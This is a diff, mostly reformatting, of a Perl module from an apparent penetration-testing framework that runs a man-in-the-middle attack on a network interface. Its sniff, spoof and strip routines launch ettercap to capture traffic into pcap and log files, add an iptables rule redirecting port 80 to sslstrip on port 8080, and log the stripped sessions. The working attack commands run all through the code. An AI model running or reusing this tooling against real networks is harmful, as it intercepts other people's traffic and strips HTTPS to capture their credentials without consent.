@@ -48,43 +48,45 @@ sub help() {                     #NECESSARY
 
 }
 
-sub clear(){ #NECESSARY - CALLED ON EXIT
-	my $self=shift();
-	    my $IO      = $self->{'core'}->{'IO'};
-$IO->print_alert("Clearing all");
-	foreach my $group(@process_groups){
-		foreach my $dev ( keys %{ $self->{$group} } ) {
+sub clear() {                    #NECESSARY - CALLED ON EXIT
+    my $self = shift();
+    my $IO   = $self->{'core'}->{'IO'};
+    $IO->print_alert("Clearing all");
+    foreach my $group (@process_groups) {
+        foreach my $dev ( keys %{ $self->{$group} } ) {
 
-					$self->stop($dev,$group);
-				}
-		
-	}	
+            $self->stop( $dev, $group );
+        }
 
-	
+    }
+
 }
-sub mitm{
+
+sub mitm {
     my $self       = shift;
     my $IO         = $self->{'core'}->{'IO'};
     my $env        = $self->{'core'}->{'env'};
     my $interfaces = $self->{'core'}->{'interfaces'};
-    my $dev = $_[0];
+    my $dev        = $_[0];
     $IO->print_title("Mitm - Man in the middle on $dev");
     $self->sniff($dev);
     $self->spoof($dev);
     $self->strip($dev);
     $self->status($dev);
-	
-	}
+
+}
+
 sub sniff {
-	#  
-	#  name:	sniff
-	#  @param	interface
-	#  @return	nothing
-	#
-	#
-	#
-	#  
-	
+
+    #
+    #  name:	sniff
+    #  @param	interface
+    #  @return	nothing
+    #
+    #
+    #
+    #
+
     my $self       = shift;
     my $IO         = $self->{'core'}->{'IO'};
     my $env        = $self->{'core'}->{'env'};
@@ -93,15 +95,18 @@ sub sniff {
     my $dev = $_[0];
     my $pcap_file =
         $env->tmp_dir() . "/" . $dev . "-ettercap-" . $env->time() . ".pcap";
-        
-       my $log_file =
-        $env->tmp_dir() . "/" . $dev . "-etterlog-" . $env->time();
-    my $process = Nemesis::Process->new(
-        type => 'daemon',    # forked pipeline
-        code => 'ettercap -Du -i ' . $dev . ' -L '.$log_file.' -w ' . $pcap_file." -P autoadd",
-        env  => $self->{'core'}->{'env'},
-        IO   => $IO,
-        file => $pcap_file,
+
+    my $log_file = $env->tmp_dir() . "/" . $dev . "-etterlog-" . $env->time();
+    my $process  = Nemesis::Process->new(
+        type => 'daemon',             # forked pipeline
+        code => 'ettercap -Du -i ' 
+            . $dev . ' -L '
+            . $log_file . ' -w '
+            . $pcap_file
+            . " -P autoadd",
+        env      => $self->{'core'}->{'env'},
+        IO       => $IO,
+        file     => $pcap_file,
         file_log => $log_file
     ) or $IO->print_error("Can't start $code");
 
@@ -112,11 +117,12 @@ sub sniff {
 }
 
 sub spoof {
-	#  
-	#  name:	spoof
-	#  @param	interface
-	#  @return	nothing
-	#  	
+
+    #
+    #  name:	spoof
+    #  @param	interface
+    #  @return	nothing
+    #
     my $self       = shift;
     my $IO         = $self->{'core'}->{'IO'};
     my $env        = $self->{'core'}->{'env'};
@@ -138,16 +144,18 @@ sub spoof {
     $IO->print_info( "PID: " . $process->get_pid() );
 }
 
-sub strip{
+sub strip {
     my $self   = shift;
     my $output = $self->{'core'}->{'IO'};
     my $env    = $self->{'core'}->{'env'};
-    my $dev= $_[0];
+    my $dev    = $_[0];
     $output->print_info("Setting iptables to redirect to sslstrip port..");
-	$output->exec("iptables -t nat -A PREROUTING -p tcp -i $dev --destination-port 80 -j REDIRECT --to-port 8080");
- my $strip_file =
+    $output->exec(
+        "iptables -t nat -A PREROUTING -p tcp -i $dev --destination-port 80 -j REDIRECT --to-port 8080"
+    );
+    my $strip_file =
         $env->tmp_dir() . "/" . $dev . "-sslstrip-" . $env->time() . ".log";
-    my $code    = 'sslstrip -l 8080 -a -k -f -w ' .$strip_file;
+    my $code    = 'sslstrip -l 8080 -a -k -f -w ' . $strip_file;
     my $process = Nemesis::Process->new(
         type => 'system',                   # forked pipeline
         code => $code,
@@ -158,60 +166,61 @@ sub strip{
     $process->start();
     $self->{'strippers'}->{$dev} = $process->get_id();
     $output->print_info( "Running: " . $process->is_running() );
-    $output->print_info( "PID: " . $process->get_pid() );	
-	
-}
+    $output->print_info( "PID: " . $process->get_pid() );
 
+}
 
 sub status {
     my $self   = shift;
     my $output = $self->{'core'}->{'IO'};
     my $env    = $self->{'core'}->{'env'};
     my $process;
-	if($_[0]){
-		
-	$output->print_title("Status of process up for $_[0]");
-	$self->status_device($_[0]);
-	
-	} else {	
-		
-	foreach my $group(@process_groups){
-		foreach my $dev ( keys %{ $self->{$group} } ) {
-			$output->print_title("Status of $group process up for $dev");
-			
-					$self->status_device($dev,$group);
-				}
-		
-	}	
+    if ( $_[0] ) {
 
-	}
-}	
+        $output->print_title("Status of process up for $_[0]");
+        $self->status_device( $_[0] );
 
-sub status_device(){
-	my $self=shift;
-    my $dev= $_[0];
-    my $group=$_[1];
+    }
+    else {
+
+        foreach my $group (@process_groups) {
+            foreach my $dev ( keys %{ $self->{$group} } ) {
+                $output->print_title("Status of $group process up for $dev");
+
+                $self->status_device( $dev, $group );
+            }
+
+        }
+
+    }
+}
+
+sub status_device() {
+    my $self   = shift;
+    my $dev    = $_[0];
+    my $group  = $_[1];
     my $output = $self->{'core'}->{'IO'};
     my $env    = $self->{'core'}->{'env'};
-	$process = new Nemesis::Process(
-				env => $self->{'core'}->{'env'},
-				IO  => $output,
-				ID  => $self->{$group}->{$dev}
-			) or $output->debug( "Can't reload " . $self->{$group}->{$dev});
-			$output->print_info($process->get_var("code"));
-			$output->print_info( "\tRunning:\t " . $process->is_running() );
-			#$output->print_info( "Output: " . $process->get_output() );
-			my $pid =$process->get_pid();
-			if($pid eq "") { $pid="Waiting for it..";}
-			$output->print_info( "\tPID:\t " .$pid  );
-			if($process->{'CONFIG'}->{'type'} eq "daemon"){
-			$output->print_info( "\tFile (Generic output by process):\t "
-					. $process->get_var('file') );
-			$output->print_info( "\tFile (Generic output by process):\t "
-					. $process->get_var('file_log') );
-			}
-			$output->print_info("\n")	
-	
+    $process = new Nemesis::Process(
+        env => $self->{'core'}->{'env'},
+        IO  => $output,
+        ID  => $self->{$group}->{$dev}
+    ) or $output->debug( "Can't reload " . $self->{$group}->{$dev} );
+    $output->print_info( $process->get_var("code") );
+    $output->print_info( "\tRunning:\t " . $process->is_running() );
+
+    #$output->print_info( "Output: " . $process->get_output() );
+    my $pid = $process->get_pid();
+    if ( $pid eq "" ) { $pid = "Waiting for it.."; }
+    $output->print_info( "\tPID:\t " . $pid );
+    if ( $process->{'CONFIG'}->{'type'} eq "daemon" ) {
+        $output->print_info( "\tFile (Generic output by process):\t "
+                . $process->get_var('file') );
+        $output->print_info( "\tFile (Generic output by process):\t "
+                . $process->get_var('file_log') );
+    }
+    $output->print_info("\n")
+
 }
 
 sub stop {
@@ -221,48 +230,50 @@ sub stop {
     my $env    = $self->{'core'}->{'env'};
     my $dev    = $_[0];
     my $group  = $_[1];
-    if(!defined($dev)){
-		$output->print_alert("You must provide a device");
-		exit;
-	}
-	if(defined($group)){
-			$output->print_title( "Stopping all activities on " . $dev . " for $group");
+    if ( !defined($dev) ) {
+        $output->print_alert("You must provide a device");
+        exit;
+    }
+    if ( defined($group) ) {
+        $output->print_title(
+            "Stopping all activities on " . $dev . " for $group" );
 
-					my $process = Nemesis::Process->new(
-				env => $self->{'core'}->{'env'},
-				IO  => $output,
-				ID  => $self->{$group}->{$dev}
-				)
-				or
-				$output->print_error( "Can't start reload ".$self->{$group}->{$dev} );
+        my $process = Nemesis::Process->new(
+            env => $self->{'core'}->{'env'},
+            IO  => $output,
+            ID  => $self->{$group}->{$dev}
+            )
+            or $output->print_error(
+            "Can't start reload " . $self->{$group}->{$dev} );
 
-			$process->stop();
-			$process->destroy();
+        $process->stop();
+        $process->destroy();
 
-			delete $self->{$group}->{$dev};
-		
-	} else {
-		foreach my $group(@process_groups){
-			if(exists($self->{$group}->{$dev})){
-				$output->print_title( "Stopping $group on " . $dev . "");
+        delete $self->{$group}->{$dev};
 
-				my $process = Nemesis::Process->new(
-					env => $self->{'core'}->{'env'},
-					IO  => $output,
-					ID  => $self->{$group}->{$dev}
-					)
-					or
-					$output->print_error( "Can't start reload ".$self->{$group}->{$dev} );
+    }
+    else {
+        foreach my $group (@process_groups) {
+            if ( exists( $self->{$group}->{$dev} ) ) {
+                $output->print_title( "Stopping $group on " . $dev . "" );
 
-				$process->stop();
-				$process->destroy();
+                my $process = Nemesis::Process->new(
+                    env => $self->{'core'}->{'env'},
+                    IO  => $output,
+                    ID  => $self->{$group}->{$dev}
+                    )
+                    or $output->print_error(
+                    "Can't start reload " . $self->{$group}->{$dev} );
 
-				delete $self->{$group}->{$dev};
-			}
-		}
-	}
-    
-	$output->exec("iptables -t nat -F");
+                $process->stop();
+                $process->destroy();
+
+                delete $self->{$group}->{$dev};
+            }
+        }
+    }
+
+    $output->exec("iptables -t nat -F");
 }
 
 sub where {
